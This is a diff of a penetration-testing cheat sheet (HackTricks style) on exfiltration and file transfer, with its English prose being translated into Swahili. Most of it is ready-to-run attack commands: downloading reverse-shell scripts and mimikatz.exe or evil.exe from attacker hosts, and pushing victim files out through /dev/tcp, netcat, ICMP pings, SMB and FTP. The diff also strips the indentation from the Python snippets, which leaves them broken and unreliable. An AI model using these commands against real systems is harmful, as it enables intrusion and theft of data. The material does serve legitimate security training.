@@ -2,39 +2,32 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Commonly whitelisted domains to exfiltrate information
+## Majimbo ya kawaida yaliyoorodheshwa ili kutoa taarifa
 
-Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
+Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata majimbo ya kawaida yaliyoorodheshwa ambayo yanaweza kutumika vibaya
 
-## Copy\&Paste Base64
+## Nakala\&Bandika Base64
 
 **Linux**
-
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-
 **Windows**
-
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-
 ## HTTP
 
 **Linux**
-
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-
 **Windows**
-
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -49,13 +42,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-
-### Upload files
+### Pakia faili
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python module [uploadserver](https://pypi.org/project/uploadserver/):
-
+- Moduli ya Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -68,9 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-
 ### **HTTPS Server**
-
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -105,31 +94,25 @@ from urllib.parse import quote
 app = Flask(__name__)
 @app.route('/')
 def root():
-    print(request.get_json())
-    return "OK"
+print(request.get_json())
+return "OK"
 if __name__ == "__main__":
-    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-
 ## FTP
 
 ### FTP server (python)
-
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-
 ### FTP server (NodeJS)
-
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-
 ### FTP server (pure-ftp)
-
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -147,9 +130,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-
-### **Windows** client
-
+### **Windows** mteja
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -160,37 +141,31 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-
 ## SMB
 
-Kali as server
-
+Kali kama seva
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-
-Or create a smb share **using samba**:
-
+Au tengeneza sehemu ya smb **ukitumia samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
 chmod 777 /tmp/smb
 #Add to the end of /etc/samba/smb.conf this:
 [public]
-    comment = Samba on Ubuntu
-    path = /tmp/smb
-    read only = no
-    browsable = yes
-    guest ok = Yes
+comment = Samba on Ubuntu
+path = /tmp/smb
+read only = no
+browsable = yes
+guest ok = Yes
 #Start samba
 service smbd restart
 ```
-
 Windows
-
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -198,54 +173,42 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
-
 ## SCP
 
-The attacker has to have SSHd running.
-
+Mshambuliaji lazima awe na SSHd ikifanya kazi.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
-
 ## SSHFS
 
-If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
-
+Ikiwa mwathirika ana SSH, mshambuliaji anaweza kuunganisha saraka kutoka kwa mwathirika hadi kwa mshambuliaji.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-
 ## NC
-
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-
 ## /dev/tcp
 
-### Download file from victim
-
+### Pakua faili kutoka kwa mwathirika
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-
-### Upload file to victim
-
+### Pakia faili kwa mwathirika
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-
-thanks to **@BinaryShadow\_**
+shukrani kwa **@BinaryShadow\_**
 
 ## **ICMP**
-
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -256,64 +219,50 @@ xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attack
 from scapy.all import *
 #This is ippsec receiver created in the HTB machine Mischief
 def process_packet(pkt):
-    if pkt.haslayer(ICMP):
-        if pkt[ICMP].type == 0:
-            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
-            print(f"{data.decode('utf-8')}", flush=True, end="")
+if pkt.haslayer(ICMP):
+if pkt[ICMP].type == 0:
+data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
-
 ## **SMTP**
 
-If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
-
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP kupokea data hiyo kwa python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
-
 ## TFTP
 
-By default in XP and 2003 (in others it needs to be explicitly added during installation)
+Kwa default katika XP na 2003 (katika zingine inahitaji kuongezwa wazi wakati wa usakinishaji)
 
-In Kali, **start TFTP server**:
-
+Katika Kali, **anza TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-
-**TFTP server in python:**
-
+**TFTP server katika python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-
-In **victim**, connect to the Kali server:
-
+Katika **mhasiriwa**, ungana na seva ya Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
-
 ## PHP
 
-Download a file with a PHP oneliner:
-
+Pakua faili yenye PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-
 ## VBScript
-
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-
-**Victim**
-
+**Mtu waathirika**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -345,23 +294,16 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
-
+Programu ya `debug.exe` si tu inaruhusu ukaguzi wa binaries bali pia ina **uwezo wa kuzijenga tena kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuunda faili la binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha kuunda faili hadi ukubwa wa 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
-
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+Kisha nakili-na-kupaste maandiko hayo kwenye windows-shell na faili inayoitwa nc.exe itaundwa.
 
 ## DNS
-
-- [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 {{#include ../banners/hacktricks-training.md}}
